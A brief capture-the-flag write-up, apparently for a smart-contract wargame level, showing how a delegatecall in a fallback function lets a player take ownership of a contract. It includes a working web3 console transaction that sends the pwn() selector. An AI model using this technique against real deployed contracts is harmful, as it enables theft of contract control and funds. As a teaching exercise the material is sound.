### Challenge:
- Claim ownership of the contract.

### Solution:
- As `Delegatecall()` prserves the context of the contract, I triggered `fallback()` which delegated the call to `pwn()`. And the owner of the contract got updated.

### Takeaway:
- Use `delegatecall` carefully

### Notes:
Trigger the `fallback()` from the console:
```js
 await web3.eth.sendTransaction({to:contract.address, from:player, data:"0xdd365b8b"})
```